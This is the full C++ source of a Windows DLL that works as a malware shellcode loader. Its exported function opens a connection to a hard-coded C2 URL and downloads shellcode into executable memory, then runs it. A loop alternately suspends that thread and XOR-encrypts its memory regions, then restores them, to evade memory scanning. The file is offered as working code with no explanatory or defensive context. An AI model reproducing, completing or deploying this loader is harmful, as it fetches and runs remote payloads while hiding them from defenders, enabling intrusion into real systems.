#include "windows.h"
#include "wininet.h"

#pragma comment(lib, "wininet")

#define BURN(...) do { \
      exit(0); \
    } while (0)

#define BUFFER_SIZE 0x1024 * 0x1024

#define ACTIVE_TIME 30 * 1000
#define HIBERNATE_TIME 30 * 1000
#define WAIT_FOR_SHELLCODE 5 * 1000

#define CRYPTO_KEY 0x41

#define C2 "http://192.168.56.1/somethingsomething"
#define UA "PowerUa"

typedef struct region {

  LPVOID baseAddr;
  ULONGLONG size;

  DWORD protection;

  region* nRegion;
  region* lRegion;

} region_t;

typedef struct config {

  HANDLE hThread;
  region_t *regions;

  bool isActive = 1;

} config_t;

DWORD WINAPI gogo(void*);

void hibernate(config_t*);
void wakeUp(config_t*);
void findRegions(config_t*);

extern "C" __declspec(dllexport) void go(void){

  DWORD dwThreadId;
  HANDLE hThread;
  config_t *config;

  config = (config_t*) malloc(sizeof(config_t));
  hThread = CreateThread( NULL, 0, gogo, NULL, 0, &dwThreadId);

  config->hThread = hThread;
  config->isActive = true;

  Sleep(WAIT_FOR_SHELLCODE); // Wait for the shellcode to do it's stuff
  findRegions(config);

  while(true){
    if(config->isActive){
      hibernate(config);
      config->isActive = false;
      Sleep(HIBERNATE_TIME);
    }else{
      wakeUp(config);
      config->isActive = true;
      Sleep(ACTIVE_TIME);
    }
  }

}

void
hibernate(config_t* config)
{
  region_t *regionTmp;
  regionTmp = config->regions;
  DWORD dwProtectOld;

  if(SuspendThread(config->hThread) == -1)
    BURN();
  
  while(regionTmp){
    for(ULONGLONG i = 0; i < regionTmp->size; i++)
      *(unsigned char*)((ULONGLONG)regionTmp->baseAddr + i) ^= CRYPTO_KEY;
    VirtualProtect(regionTmp->baseAddr, regionTmp->size, PAGE_READONLY, &dwProtectOld);

    regionTmp = regionTmp->nRegion;
  }
}

void
wakeUp(config_t* config)
{
  region_t *regionTmp;
  regionTmp = config->regions;
  DWORD dwProtectOld;

  while(regionTmp){
    VirtualProtect(regionTmp->baseAddr, regionTmp->size, PAGE_EXECUTE_READWRITE, &dwProtectOld);
    for(ULONGLONG i = 0; i < regionTmp->size; i++)
      *(unsigned char*)((ULONGLONG)regionTmp->baseAddr + i) ^= CRYPTO_KEY;
    regionTmp = regionTmp->nRegion;
  }

  if(ResumeThread(config->hThread) == -1)
    BURN();
}

void 
findRegions(config_t* config)
{

  LPVOID lpMem = 0;
  MEMORY_BASIC_INFORMATION mbi;
  SYSTEM_INFO si;
  region_t* region, *lRegion;

  region = NULL;
  lRegion = NULL;

  GetSystemInfo(&si);

  while (lpMem < si.lpMaximumApplicationAddress){

      VirtualQueryEx(GetCurrentProcess(), lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
      lpMem = (LPVOID)((ULONGLONG)mbi.BaseAddress + mbi.RegionSize);

      if (mbi.State == MEM_FREE || mbi.AllocationProtect != PAGE_EXECUTE_READWRITE)
        continue;

      region = (region_t*)malloc(sizeof(region_t));
      memset(region, 0, sizeof(region_t));

      region->baseAddr = mbi.BaseAddress;
      region->size = mbi.RegionSize;
      region->protection = mbi.AllocationProtect;

      if(lRegion != NULL){
        region->lRegion = lRegion;
        lRegion->nRegion = region;
      }

      lRegion = region;

    }

  while(region->lRegion)
    region = region->lRegion;
  config->regions = region;

}

DWORD WINAPI
gogo(void *x)
{

  HINTERNET hInternet, hUrl;

  DWORD dwRead;
  LPVOID ptr_buffer;

  hInternet = InternetOpenA(UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  hUrl = InternetOpenUrlA(hInternet, C2, NULL, 0, 0, 0);

  ptr_buffer = VirtualAlloc(0, BUFFER_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  InternetReadFile(hUrl, ptr_buffer, BUFFER_SIZE, &dwRead);
  
  ((void(*)())ptr_buffer)();

  return 0;

}
